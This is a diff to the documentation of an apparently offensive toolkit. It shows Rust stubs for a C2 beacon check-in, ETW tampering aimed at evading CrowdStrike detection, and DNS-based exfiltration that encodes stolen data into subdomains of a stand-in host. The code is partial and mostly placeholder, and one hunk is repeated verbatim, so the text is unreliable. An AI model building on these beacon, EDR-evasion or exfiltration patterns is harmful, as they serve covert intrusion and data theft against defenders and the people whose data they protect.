@@ -31,8 +31,9 @@ loader-stubs — Reflective loaders for position-independent code
 
 Module Stubs / Quick Examples
 Controlled illustrative snippets only. Real payloads are compartmented, air-gapped and mandate-protected.
-beacon-core (memory-resident check-in stub)
 
+beacon-core (memory-resident check-in stub)
+```
 // beacon-core/src/checkin.rs
 // MITRE ATT&CK: T1071.001 (Application Layer Protocol), T1573 (Encrypted Channel)
 // Tested against CrowdStrike Falcon agent 7.15+ behavioral baseline (Fall 2025)
@@ -53,8 +54,9 @@ fn beacon_checkin() -> Result<String, std::io::Error> {
     
     Ok(response.trim().to_string())
 }
-
+```
 edr-evasion (ETW provider tamper stub)
+```
 // edr-evasion/src/etw_tamper.rs
 // Technique: ObRegisterCallbacks unhooking / ETW provider disable
 // Detection hypothesis: may trigger CrowdStrike behavioral alert on suspicious kernel callback modification
@@ -65,8 +67,9 @@ unsafe fn disable_etw_provider() {
     println!("[*] ETW provider tampering stub - would dynamically resolve ntdll!EtwEventWrite here");
     // ... actual unhooking / patching logic follows in protected version
 }
-
+```
 edr-evasion (ETW provider tamper stub)
+```
 // edr-evasion/src/etw_tamper.rs
 // Technique: ObRegisterCallbacks unhooking / ETW provider disable
 // Detection hypothesis: may trigger CrowdStrike behavioral alert on suspicious kernel callback modification
@@ -77,8 +80,9 @@ unsafe fn disable_etw_provider() {
     println!("[*] ETW provider tampering stub - would dynamically resolve ntdll!EtwEventWrite here");
     // ... actual unhooking / patching logic follows in protected version
 }
-
+```
 exfil-channels (DNS TXT exfil stub)
+```
 // exfil-channels/src/dns_exfil.rs
 // MITRE ATT&CK: T1048 (Exfiltration Over Alternative Protocol)
 // Encoding: base32hex + subdomain labels
@@ -88,7 +92,7 @@ fn exfil_dns(data: &[u8]) -> String {
     let encoded = base32::encode(base32::Alphabet::RFC4648 { padding: false }, data);
     format!("{}.exfil.ncdd-no.internal", encoded.to_lowercase())
 }
-
+```
 These are illustrative stubs only. Full operational implementations require OMEGA clearance and air-gapped validation.
 Important
 
